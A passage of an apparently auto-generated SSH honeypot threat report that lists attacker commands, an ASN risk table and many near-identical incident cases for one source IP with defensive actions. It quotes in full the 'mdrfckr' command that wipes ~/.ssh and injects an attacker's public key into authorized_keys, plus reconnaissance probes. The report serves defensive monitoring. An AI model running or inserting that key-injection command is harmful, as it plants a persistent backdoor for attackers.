```
```
uname -m
```
```
cat /proc/cpuinfo
```
```
/bin/busybox TEST
```
```
cat /proc
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `4.240.82.91`, `5.252.226.244`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **63** |
| Unique ASNs | **49** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | LOW |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS48721` | Flyservers S.A. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS47890` | UNMANAGED LTD | 2 | LOW |
| `AS4766` | Korea Telecom | 2 | LOW |
| `AS22773` | Cox Communications Inc. | 2 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (251)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-291ce22ca72d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:07` | `cowrie.session.connect` |
| `2026-08-08 16:55:07` | `cowrie.client.version` |
| `2026-08-08 16:55:07` | `cowrie.client.kex` |
| `2026-08-08 16:55:08` | `cowrie.login.success` |
| `2026-08-08 16:55:09` | `cowrie.session.params` |
| `2026-08-08 16:55:09` | `cowrie.command.input` |
| `2026-08-08 16:55:09` | `cowrie.log.closed` |
| `2026-08-08 16:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-309f05aa1caa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:13` | `cowrie.session.connect` |
| `2026-08-08 16:55:13` | `cowrie.client.version` |
| `2026-08-08 16:55:13` | `cowrie.client.kex` |
| `2026-08-08 16:55:13` | `cowrie.login.success` |
| `2026-08-08 16:55:14` | `cowrie.session.params` |
| `2026-08-08 16:55:14` | `cowrie.command.input` |
| `2026-08-08 16:55:14` | `cowrie.log.closed` |
| `2026-08-08 16:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eadcad30d832

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:19` | `cowrie.session.connect` |
| `2026-08-08 16:55:19` | `cowrie.client.version` |
| `2026-08-08 16:55:19` | `cowrie.client.kex` |
| `2026-08-08 16:55:19` | `cowrie.login.success` |
| `2026-08-08 16:55:20` | `cowrie.session.params` |
| `2026-08-08 16:55:20` | `cowrie.command.input` |
| `2026-08-08 16:55:20` | `cowrie.log.closed` |
| `2026-08-08 16:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1855019054

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:24` | `cowrie.session.connect` |
| `2026-08-08 16:55:24` | `cowrie.client.version` |
| `2026-08-08 16:55:24` | `cowrie.client.kex` |
| `2026-08-08 16:55:25` | `cowrie.login.success` |
| `2026-08-08 16:55:25` | `cowrie.session.params` |
| `2026-08-08 16:55:25` | `cowrie.command.input` |
| `2026-08-08 16:55:26` | `cowrie.log.closed` |
| `2026-08-08 16:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb7ad0f8ae5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:30` | `cowrie.session.connect` |
| `2026-08-08 16:55:30` | `cowrie.client.version` |
| `2026-08-08 16:55:31` | `cowrie.client.kex` |
| `2026-08-08 16:55:31` | `cowrie.login.success` |
| `2026-08-08 16:55:32` | `cowrie.session.params` |
| `2026-08-08 16:55:32` | `cowrie.command.input` |
| `2026-08-08 16:55:32` | `cowrie.log.closed` |
| `2026-08-08 16:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361af505f6b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:36` | `cowrie.session.connect` |
| `2026-08-08 16:55:36` | `cowrie.client.version` |
| `2026-08-08 16:55:36` | `cowrie.client.kex` |
| `2026-08-08 16:55:37` | `cowrie.login.success` |
| `2026-08-08 16:55:38` | `cowrie.session.params` |
| `2026-08-08 16:55:38` | `cowrie.command.input` |
| `2026-08-08 16:55:39` | `cowrie.log.closed` |
| `2026-08-08 16:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1f7e1b0388

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:42` | `cowrie.session.connect` |
| `2026-08-08 16:55:42` | `cowrie.client.version` |
| `2026-08-08 16:55:42` | `cowrie.client.kex` |
| `2026-08-08 16:55:43` | `cowrie.login.success` |
| `2026-08-08 16:55:44` | `cowrie.session.params` |
| `2026-08-08 16:55:44` | `cowrie.command.input` |
| `2026-08-08 16:55:44` | `cowrie.log.closed` |
| `2026-08-08 16:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d99f34a91ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:48` | `cowrie.session.connect` |
| `2026-08-08 16:55:48` | `cowrie.client.version` |
| `2026-08-08 16:55:48` | `cowrie.client.kex` |
| `2026-08-08 16:55:49` | `cowrie.login.success` |
| `2026-08-08 16:55:50` | `cowrie.session.params` |
| `2026-08-08 16:55:50` | `cowrie.command.input` |
| `2026-08-08 16:55:50` | `cowrie.log.closed` |
| `2026-08-08 16:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d822802c735a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:55 |
| **Last Seen** | 2026-08-08 16:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:55:54` | `cowrie.session.connect` |
| `2026-08-08 16:55:54` | `cowrie.client.version` |
| `2026-08-08 16:55:54` | `cowrie.client.kex` |
| `2026-08-08 16:55:55` | `cowrie.login.success` |
| `2026-08-08 16:55:56` | `cowrie.session.params` |
| `2026-08-08 16:55:56` | `cowrie.command.input` |
| `2026-08-08 16:55:57` | `cowrie.log.closed` |
| `2026-08-08 16:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc79d137358d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:00` | `cowrie.session.connect` |
| `2026-08-08 16:56:00` | `cowrie.client.version` |
| `2026-08-08 16:56:00` | `cowrie.client.kex` |
| `2026-08-08 16:56:01` | `cowrie.login.success` |
| `2026-08-08 16:56:02` | `cowrie.session.params` |
| `2026-08-08 16:56:02` | `cowrie.command.input` |
| `2026-08-08 16:56:02` | `cowrie.log.closed` |
| `2026-08-08 16:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c569941df4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:05` | `cowrie.session.connect` |
| `2026-08-08 16:56:05` | `cowrie.client.version` |
| `2026-08-08 16:56:06` | `cowrie.client.kex` |
| `2026-08-08 16:56:07` | `cowrie.login.success` |
| `2026-08-08 16:56:08` | `cowrie.session.params` |
| `2026-08-08 16:56:08` | `cowrie.command.input` |
| `2026-08-08 16:56:08` | `cowrie.log.closed` |
| `2026-08-08 16:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c32fa26493

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:11` | `cowrie.session.connect` |
| `2026-08-08 16:56:11` | `cowrie.client.version` |
| `2026-08-08 16:56:11` | `cowrie.client.kex` |
| `2026-08-08 16:56:12` | `cowrie.login.success` |
| `2026-08-08 16:56:13` | `cowrie.session.params` |
| `2026-08-08 16:56:13` | `cowrie.command.input` |
| `2026-08-08 16:56:13` | `cowrie.log.closed` |
| `2026-08-08 16:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec0376e78b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:17` | `cowrie.session.connect` |
| `2026-08-08 16:56:17` | `cowrie.client.version` |
| `2026-08-08 16:56:17` | `cowrie.client.kex` |
| `2026-08-08 16:56:18` | `cowrie.login.success` |
| `2026-08-08 16:56:19` | `cowrie.session.params` |
| `2026-08-08 16:56:19` | `cowrie.command.input` |
| `2026-08-08 16:56:19` | `cowrie.log.closed` |
| `2026-08-08 16:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cafd4c942b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:23` | `cowrie.session.connect` |
| `2026-08-08 16:56:23` | `cowrie.client.version` |
| `2026-08-08 16:56:23` | `cowrie.client.kex` |
| `2026-08-08 16:56:24` | `cowrie.login.success` |
| `2026-08-08 16:56:25` | `cowrie.session.params` |
| `2026-08-08 16:56:25` | `cowrie.command.input` |
| `2026-08-08 16:56:25` | `cowrie.log.closed` |
| `2026-08-08 16:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1601f201ea89

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:29` | `cowrie.session.connect` |
| `2026-08-08 16:56:29` | `cowrie.client.version` |
| `2026-08-08 16:56:29` | `cowrie.client.kex` |
| `2026-08-08 16:56:29` | `cowrie.login.success` |
| `2026-08-08 16:56:30` | `cowrie.session.params` |
| `2026-08-08 16:56:30` | `cowrie.command.input` |
| `2026-08-08 16:56:30` | `cowrie.log.closed` |
| `2026-08-08 16:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cb6073e52e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:35` | `cowrie.session.connect` |
| `2026-08-08 16:56:35` | `cowrie.client.version` |
| `2026-08-08 16:56:35` | `cowrie.client.kex` |
| `2026-08-08 16:56:36` | `cowrie.login.success` |
| `2026-08-08 16:56:37` | `cowrie.session.params` |
| `2026-08-08 16:56:37` | `cowrie.command.input` |
| `2026-08-08 16:56:37` | `cowrie.log.closed` |
| `2026-08-08 16:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae764df3a82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:41` | `cowrie.session.connect` |
| `2026-08-08 16:56:41` | `cowrie.client.version` |
| `2026-08-08 16:56:41` | `cowrie.client.kex` |
| `2026-08-08 16:56:42` | `cowrie.login.success` |
| `2026-08-08 16:56:42` | `cowrie.session.params` |
| `2026-08-08 16:56:42` | `cowrie.command.input` |
| `2026-08-08 16:56:43` | `cowrie.log.closed` |
| `2026-08-08 16:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715d292d9af8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:47` | `cowrie.session.connect` |
| `2026-08-08 16:56:48` | `cowrie.client.version` |
| `2026-08-08 16:56:48` | `cowrie.client.kex` |
| `2026-08-08 16:56:48` | `cowrie.login.success` |
| `2026-08-08 16:56:49` | `cowrie.session.params` |
| `2026-08-08 16:56:49` | `cowrie.command.input` |
| `2026-08-08 16:56:50` | `cowrie.log.closed` |
| `2026-08-08 16:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1387e042198

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:53` | `cowrie.session.connect` |
| `2026-08-08 16:56:53` | `cowrie.client.version` |
| `2026-08-08 16:56:53` | `cowrie.client.kex` |
| `2026-08-08 16:56:54` | `cowrie.login.success` |
| `2026-08-08 16:56:56` | `cowrie.session.params` |
| `2026-08-08 16:56:56` | `cowrie.command.input` |
| `2026-08-08 16:56:56` | `cowrie.log.closed` |
| `2026-08-08 16:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bbaaa136d10

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:56 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:56:59` | `cowrie.session.connect` |
| `2026-08-08 16:56:59` | `cowrie.client.version` |
| `2026-08-08 16:56:59` | `cowrie.client.kex` |
| `2026-08-08 16:57:01` | `cowrie.login.success` |
| `2026-08-08 16:57:03` | `cowrie.session.params` |
| `2026-08-08 16:57:03` | `cowrie.command.input` |
| `2026-08-08 16:57:03` | `cowrie.log.closed` |
| `2026-08-08 16:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68fa37e11694

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:06` | `cowrie.session.connect` |
| `2026-08-08 16:57:06` | `cowrie.client.version` |
| `2026-08-08 16:57:07` | `cowrie.client.kex` |
| `2026-08-08 16:57:07` | `cowrie.login.success` |
| `2026-08-08 16:57:07` | `cowrie.session.params` |
| `2026-08-08 16:57:07` | `cowrie.command.input` |
| `2026-08-08 16:57:08` | `cowrie.log.closed` |
| `2026-08-08 16:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85429fc7bf2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:12` | `cowrie.session.connect` |
| `2026-08-08 16:57:13` | `cowrie.client.version` |
| `2026-08-08 16:57:13` | `cowrie.client.kex` |
| `2026-08-08 16:57:13` | `cowrie.login.success` |
| `2026-08-08 16:57:14` | `cowrie.session.params` |
| `2026-08-08 16:57:14` | `cowrie.command.input` |
| `2026-08-08 16:57:14` | `cowrie.log.closed` |
| `2026-08-08 16:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63a817e2577

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:19` | `cowrie.session.connect` |
| `2026-08-08 16:57:19` | `cowrie.client.version` |
| `2026-08-08 16:57:19` | `cowrie.client.kex` |
| `2026-08-08 16:57:20` | `cowrie.login.success` |
| `2026-08-08 16:57:21` | `cowrie.session.params` |
| `2026-08-08 16:57:21` | `cowrie.command.input` |
| `2026-08-08 16:57:21` | `cowrie.log.closed` |
| `2026-08-08 16:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbbc8e80b9a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:25` | `cowrie.session.connect` |
| `2026-08-08 16:57:25` | `cowrie.client.version` |
| `2026-08-08 16:57:25` | `cowrie.client.kex` |
| `2026-08-08 16:57:27` | `cowrie.login.success` |
| `2026-08-08 16:57:29` | `cowrie.session.params` |
| `2026-08-08 16:57:29` | `cowrie.command.input` |
| `2026-08-08 16:57:29` | `cowrie.log.closed` |
| `2026-08-08 16:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
